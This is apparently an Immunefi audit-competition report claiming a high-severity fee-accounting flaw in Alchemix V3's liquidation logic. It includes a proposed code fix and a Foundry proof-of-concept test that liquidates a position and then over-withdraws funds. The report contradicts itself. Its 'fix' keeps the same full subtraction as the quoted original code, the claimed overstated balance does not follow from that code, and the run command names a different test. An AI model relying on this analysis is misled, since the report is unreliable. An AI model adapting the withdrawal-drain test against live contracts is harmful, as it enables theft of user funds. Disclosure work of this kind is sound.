# 58547 sc high mismatched accounting and transfer for capped fees&#x20;

**Submitted on Nov 3rd 2025 at 07:23:58 UTC by @Petrus for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58547
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The \_doLiquidation () in AlchemistV3 subtracts the full amountLiquidated from the account's collateralBalance before transferring the net amount to the transmuter and conditionally paying the feeInYield to the liquidator based on the remaining balance, typically failing the check and leaving fees unpaid or succeeding without further deduction to overstate the account's balance.

## Vulnerability Details

Snippet from the affected \_doLiquidation:

```solidtiy
// update user balance and debt 

account.collateralBalance = account.collateralBalance > amountLiquidated ? account.collateralBalance - amountLiquidated : 0; 

_subDebt(accountId, debtToBurn); 

  

// send liquidation amount - fee to transmuter 

TokenUtils.safeTransfer(myt, transmuter, amountLiquidated - feeInYield); 

  

// send base fee to liquidator if available 

if (feeInYield > 0 && account.collateralBalance >= feeInYield) {  // Post-sub check 

    TokenUtils.safeTransfer(myt, msg.sender, feeInYield);  // No further sub! 

} 
```

The function subtracts the full amountLiquidated from the account's collateralBalance before transferring amountLiquidated - feeInYield to the transmuter and checking the post-subtraction collateralBalance >= feeInYield to conditionally transfer the feeInYield to the liquidator without further subtracting it from the account balance, often preventing the fee transfer or leaving the balance overstated if transferred.

## Recommendation

To fix the incorrect fee payment logic in \_doLiquidation by removing the flawed post-subtraction check and always transferring the feeInYield to the liquidator (as it's intended from the liquidated collateral), while ensuring the total deduction from account.collateralBalance matches the outflows to transmuter and liquidator to maintain accurate accounting.

```solidity
/// @dev Performs the actual liquidation logic when collateralization is below the lower bound  
 
/// @param accountId The tokenId of the account to to liquidate.  
/// @param collateralInUnderlying The total collateral value of the account in debt tokens. /// @param repaidAmountInYield The amount of debt repaid in yield tokens. 
 /// @return amountLiquidated The amount of yield tokens liquidated.  
/// @return feeInYield The fee in yield tokens to be sent to the liquidator. 
 /// @return feeInUnderlying The fee in underlying tokens to be sent to the liquidator. 
 
 function _doLiquidation(uint256 accountId, uint256 collateralInUnderlying, uint256 repaidAmountInYield) internal returns (uint256 amountLiquidated, uint256 feeInYield, uint256 feeInUnderlying) { 
 Account storage account = _accounts[accountId]; 

(uint256 liquidationAmount, uint256 debtToBurn, uint256 baseFee, uint256 outsourcedFee) = calculateLiquidation( 
   collateralInUnderlying, 
   account.debt, 
   minimumCollateralization, 
   normalizeUnderlyingTokensToDebt(_getTotalUnderlyingValue()) * FIXED_POINT_SCALAR / totalDebt, 
   globalMinimumCollateralization, 
   liquidatorFee 
); 
 
amountLiquidated = convertDebtTokensToYield(liquidationAmount); 
feeInYield = convertDebtTokensToYield(baseFee); 
 
// Deduct total outflow (to transmuter + liquidator fee) from account balance to match actual transfers 
uint256 totalOutflow = amountLiquidated;  // Includes fee as part of liquidated amount 
account.collateralBalance = account.collateralBalance > totalOutflow ? account.collateralBalance - totalOutflow : 0; 
_subDebt(accountId, debtToBurn); 
 
// Send net amount (excluding liquidator fee) to transmuter 
uint256 netToTransmuter = amountLiquidated > feeInYield ? amountLiquidated - feeInYield : 0; 
if (netToTransmuter > 0) { 
   TokenUtils.safeTransfer(myt, transmuter, netToTransmuter); 
} 
 
// Always send base fee to liquidator (no check needed, as it's from liquidated collateral) 
if (feeInYield > 0) { 
   TokenUtils.safeTransfer(myt, msg.sender, feeInYield); 
} 
 
// Handle outsourced fee from vault 
if (outsourcedFee > 0) { 
   uint256 vaultBalance = IFeeVault(alchemistFeeVault).totalDeposits(); 
   if (vaultBalance > 0) { 
       uint256 feeBonus = normalizeDebtTokensToUnderlying(outsourcedFee); 
       feeInUnderlying = vaultBalance > feeBonus ? feeBonus : vaultBalance; 
       IFeeVault(alchemistFeeVault).withdraw(msg.sender, feeInUnderlying); 
   } 
} 
 
emit Liquidated(accountId, msg.sender, amountLiquidated + repaidAmountInYield, feeInYield, feeInUnderlying); 
return (amountLiquidated + repaidAmountInYield, feeInYield, feeInUnderlying); 
 

} 

```

OR precisely, transfer amountLiquidated - feeInYield to the transmuter and feeInYield to the liquidator.

## Impact Details

Liquidators are frequently underpaid or unpaid, disincentivizing liquidations, while successful transfers cause accounting mismatches that enable over-withdrawals

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L852>

## Proof of Concept

## Proof of Concept

Put the test in AlchemistV3.t.sol

Run the test with: forge test --match-test testLiquidationUnpaidFeeAndUnderstatedUserCollateral -vvvv

```solidity
function testLiquidationOverstatedUserCollateralEnablesOverWithdrawal() external { 

// Setup: Large healthy position to keep global collateralization healthy 

uint256 healthyDeposit = 1000e18;
 vm.startPrank(yetAnotherExternalUser); SafeERC20.safeApprove(address(vault), address(alchemist), healthyDeposit);
 alchemist.deposit(healthyDeposit, yetAnotherExternalUser, 0); 
uint256 healthyTokenId = AlchemistNFTHelper.getFirstTokenId(yetAnotherExternalUser, address(alchemistNFT)); 
vm.stopPrank(); 

// Setup: Bad position with sufficient surplus for fee payment 
uint256 badDeposit = 100e18; 
vm.startPrank(address(0xbeef)); 
SafeERC20.safeApprove(address(vault), address(alchemist), badDeposit); 
alchemist.deposit(badDeposit, address(0xbeef), 0); 
uint256 badTokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT)); 
 
// Mint with moderate surplus > fee (ensures condition succeeds after full subtract) 
uint256 maxBorrowable = alchemist.getMaxBorrowable(badTokenId); 
uint256 debtWithSurplus = maxBorrowable * 90 / 100; // ~10% surplus 
alchemist.mint(badTokenId, debtWithSurplus, address(0xbeef)); 
vm.stopPrank(); 
 
// Pre-liquidation state: Record shares in contract 
uint256 preAlchemistShares = IERC20(alchemist.myt()).balanceOf(address(alchemist)); 
(uint256 preBadCollateral, uint256 preBadDebt, ) = alchemist.getCDP(badTokenId); 
 
// Trigger undercollateralization via price drop (small drop to keep surplus > fee post-subtract) 
uint256 initialSupply = IERC20(mockStrategyYieldToken).totalSupply(); 
IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialSupply * 118 / 100); // ~15.25% price drop 
 
// Verify undercollateralized but surplus > fee post-sub 
uint256 postDropBadValue = alchemist.totalValue(badTokenId); 
assertLt(postDropBadValue * FIXED_POINT_SCALAR / preBadDebt, alchemist.collateralizationLowerBound()); 
uint256 postDropSurplus = postDropBadValue > preBadDebt ? postDropBadValue - preBadDebt : 0; 
assertGt(alchemist.convertDebtTokensToYield(postDropSurplus) * alchemist.liquidatorFee() / BPS, 0); // Surplus covers fee 
 
// Expected: Surplus allows fee payment; after full subtract, remaining >= fee, so paid but no double-subtract 
uint256 alchemistCollat = alchemist.normalizeUnderlyingTokensToDebt(alchemist.getTotalUnderlyingValue()) * FIXED_POINT_SCALAR / alchemist.totalDebt(); 
(uint256 grossSeizeDebt, uint256 debtBurn, uint256 baseFeeDebt, ) = alchemist.calculateLiquidation( 
   postDropBadValue, 
   preBadDebt, 
   alchemist.minimumCollateralization(), 
   alchemistCollat, 
   alchemist.globalMinimumCollateralization(), 
   alchemist.liquidatorFee() 
); 
uint256 expectedGrossSeizeYield = alchemist.convertDebtTokensToYield(grossSeizeDebt); 
uint256 expectedBaseFeeYield = alchemist.convertDebtTokensToYield(baseFeeDebt); 
uint256 expectedNetTransferYield = expectedGrossSeizeYield - expectedBaseFeeYield; // To transmuter 
uint256 expectedPostBadCollateral = preBadCollateral - expectedGrossSeizeYield + expectedBaseFeeYield; // Overstated: no fee subtract 
 
// Liquidate: Fee paid (condition succeeds), net to transmuter, fee to liquidator, but accounting subtracts only gross (overstates user collateral) 
uint256 preLiquidatorShares = IERC20(alchemist.myt()).balanceOf(externalUser); 
vm.startPrank(externalUser); 
(uint256 liqYield, uint256 liqFeeYield, uint256 liqFeeUnderlying) = alchemist.liquidate(badTokenId); 
vm.stopPrank(); 
 
// Post-liquidation state 
uint256 postAlchemistShares = IERC20(alchemist.myt()).balanceOf(address(alchemist)); 
(uint256 postBadCollateral, uint256 postBadDebt, ) = alchemist.getCDP(badTokenId); 
uint256 postLiquidatorShares = IERC20(alchemist.myt()).balanceOf(externalUser); 
 
// Verify fee paid to liquidator (condition succeeded) 
assertGt(liqFeeYield, 0); 
assertApproxEqAbs(postLiquidatorShares - preLiquidatorShares, expectedBaseFeeYield, 1e15); 
 
// Verify net transferred to transmuter 
assertApproxEqAbs(preAlchemistShares - postAlchemistShares, expectedNetTransferYield + expectedBaseFeeYield, 1e15); // Net + fee paid out 
 
// Verify user collateral overstated (subtracted gross but fee paid separately, no deduct) 
assertApproxEqAbs(postBadCollateral, expectedPostBadCollateral, 1e15); // Over by expectedBaseFeeYield 
assertApproxEqAbs(postBadDebt, preBadDebt - debtBurn, 1e15); 
 
// Calculate correct post-collateral: subtract only net transferred (actual shares removed) 
uint256 expectedCorrectPostCollateral = preBadCollateral - expectedNetTransferYield; 
// Actual overstated by fee amount 
assertApproxEqAbs(postBadCollateral, expectedCorrectPostCollateral + expectedBaseFeeYield, 1e15); 
 
// Demonstrate impact: User withdraws overstated amount, draining contract of fee shares 
uint256 withdrawable = postBadCollateral; 
uint256 preWithdrawAlchemistShares = postAlchemistShares; 
vm.prank(address(0xbeef)); 
uint256 withdrawn = alchemist.withdraw(withdrawable, address(0xbeef), badTokenId); 
uint256 postWithdrawAlchemistShares = IERC20(alchemist.myt()).balanceOf(address(alchemist)); 
 
// User withdraws overstated amount (includes fee shares not subtracted) 
assertEq(withdrawn, withdrawable); 
assertGt(withdrawn, expectedCorrectPostCollateral); // Over-withdrawal by fee 
 
// Contract loses extra shares (drained by over-withdrawal) 
assertEq(postWithdrawAlchemistShares, preWithdrawAlchemistShares - withdrawable); 
assertLt(postWithdrawAlchemistShares, preWithdrawAlchemistShares - expectedCorrectPostCollateral); // Extra loss = fee 
 

} 

```
